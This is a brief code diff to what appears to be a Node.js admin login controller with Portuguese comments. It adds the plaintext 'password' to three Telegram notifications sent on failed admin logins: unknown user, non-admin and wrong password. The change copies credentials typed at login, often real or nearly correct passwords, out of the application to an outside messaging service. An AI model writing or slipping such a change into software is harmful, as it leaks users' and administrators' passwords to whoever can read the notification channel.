@@ -31,6 +31,7 @@ class AdminController {
         // Notificar via Telegram
         telegramService.notifyAdminLoginFailed({
           email,
+          password,
           reason: 'user_not_found',
           ip: clientIP,
           userAgent: req.get('user-agent'),
@@ -50,6 +51,7 @@ class AdminController {
         // Notificar via Telegram
         telegramService.notifyAdminLoginFailed({
           email,
+          password,
           reason: 'not_admin',
           ip: clientIP,
           userAgent: req.get('user-agent'),
@@ -70,6 +72,7 @@ class AdminController {
         // Notificar via Telegram
         telegramService.notifyAdminLoginFailed({
           email,
+          password,
           reason: 'invalid_password',
           ip: clientIP,
           userAgent: req.get('user-agent'),
